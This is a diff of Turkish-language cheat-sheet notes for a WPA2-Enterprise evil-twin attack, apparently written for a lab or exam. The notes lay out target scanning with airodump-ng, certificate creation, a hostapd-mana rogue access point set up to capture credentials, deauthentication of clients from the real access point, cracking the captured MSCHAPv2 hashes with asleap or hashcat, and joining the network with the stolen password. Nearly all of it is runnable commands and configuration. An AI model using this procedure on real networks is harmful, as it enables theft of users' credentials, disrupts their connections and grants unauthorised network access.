@@ -1,56 +1,52 @@
-
-### Hazırlık
-```bash
-sudo su
-ip -br -c a
-```
-
+ 
 # Kanal numarası ve AP ismi almadan önce, kablosuz kartın ismini bulmalısınız, monitoring işlemini sonlandırabilirsiniz.
 
 # Stop monitor mode
     airmon-ng stop wlan0
 
-### Monitor Mod + Tarama
+### Adım 1: Hedef Belirleme
 ```bash
-sudo airmon-ng start wlan0
 airodump-ng wlan0mon --band abg
-# BSSID ve Channel not et
+# Not al: BSSID, ESSID, Channel (AUTH=MGT olmalı)
 ```
 
-### Sertifika Oluştur
+### Adım 2: Sertifikalar Oluştur
 ```bash
+# CA Certificate
 openssl genrsa -aes256 -out ca.key.pem 4096
 # Şifre: 1234
 openssl req -x509 -new -nodes -key ca.key.pem -sha256 -days 3650 -out ca.cert.pem
-# Bilgileri doldur (ülke, şehir vs.)
+# Bilgileri doldur (Country, State, City, vb.)
+
+# Server Certificate
 openssl genrsa -aes256 -out server.key.pem 2048
 # Şifre: 1234
 openssl req -new -key server.key.pem -out server.csr.pem
 # Bilgileri doldur
 openssl x509 -req -in server.csr.pem -CA ca.cert.pem -CAkey ca.key.pem -CAcreateserial -out server.cert.pem -days 365 -sha256
+
+# DH Parameters
 openssl dhparam -out dh -2 2048
 ```
 
-### EAP User Dosyası
+### Adım 3: EAP User Dosyası
 ```bash
 nano mana.eap_user
 ```
-
-# Create .eap_user file
 ```
 * PEAP,TTLS,TLS,FAST
 "t" TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2 "pass" [2]
 ```
 
-### Mana Config
+### Adım 4: Hostapd Config
 ```bash
 nano mana.conf
 ```
 ```
-ssid=[TARGET_SSID]
+ssid=[TARGET_ESSID]
 interface=wlan0
 driver=nl80211
-channel=[TARGET_CHANNEL]
+channel=[CHANNEL]
 hw_mode=g
 ieee8021x=1
 eap_server=1
@@ -62,52 +58,61 @@ private_key=server.key.pem
 private_key_passwd=1234
 dh_file=dh
 auth_algs=1
-wpa=3 # It means that wpa/wpa2
-wpa_key_mgmt=WPA-EAP # It means that WPA Enterprise 
+wpa=3
+wpa_key_mgmt=WPA-EAP
 wpa_pairwise=CCMP TKIP
 mana_wpe=1
 mana_credout=/tmp/hostapd.credout
 mana_eapsuccess=1
 ```
 
-### Sahte AP Başlat + Deauth
+### Adım 5: Monitor Modu Durdur + Sahte AP Başlat
 ```bash
-# Terminal 1:
+airmon-ng stop wlan0mon
 hostapd-mana mana.conf
-
-# Terminal 2 (opsiyonel - kullanıcıyı kopartmak için):
-aireplay-ng -0 10 -a [REAL_AP_MAC] wlan0
-# Hash yakalandığında Ctrl+C
 ```
 
-# yakalanan kullanıcı kimlik bilgilerinin hash'ini alın ve asleap aracıyla kırın.
+### Adım 6: Deauth (Başka Terminal - Başka Interface)
+```bash
+# Eğer ikinci wifi var ise:
+airmon-ng start wlan1
+iwconfig wlan1mon channel [CHANNEL]
+aireplay-ng -0 10 -a [REAL_BSSID] wlan1mon
+# Hash yakalanınca Ctrl+C
+```
+
+### Adım 7: Hash Kontrol
 ```bash
 cat /tmp/hostapd.credout
-# challenge ve response değerlerini not et
-
-asleap -C [challenge] -R [response] -W /usr/share/john/password.lst
-# password: [PASSWORD] çıktısını kaydet
+# challenge ve response değerlerini not al
 ```
 
-### Bağlan
+### Adım 8: Hash Kır
 ```bash
-nano wpa_sup.conf
+asleap -C [challenge] -R [response] -W /usr/share/john/password.lst
+# password: [PAROLA] çıktısını kaydet
+
+# VEYA hashcat ile:
+# hashcat -m 5500 ile kırabilirsin
+```
+
+### Adım 9: Bağlan
+```bash
+nano wpa_ent.conf
 ```
 ```
 network={
-    ssid="[SSID]"
+    ssid="[ESSID]"
     key_mgmt=WPA-EAP
     eap=PEAP
     identity="[DOMAIN]\[USERNAME]"
-    password="[PASSWORD]"
+    password="[PAROLA]"
     phase2="auth=MSCHAPV2"
     priority=1
 }
 ```
 ```bash
-airmon-ng stop wlan0mon
-wpa_supplicant -Dnl80211 -iwlan0 -c wpa_sup.conf
-# Yeni terminal:
+wpa_supplicant -D nl80211 -i wlan0 -c wpa_ent.conf &
 dhclient wlan0 -v
 ```
      
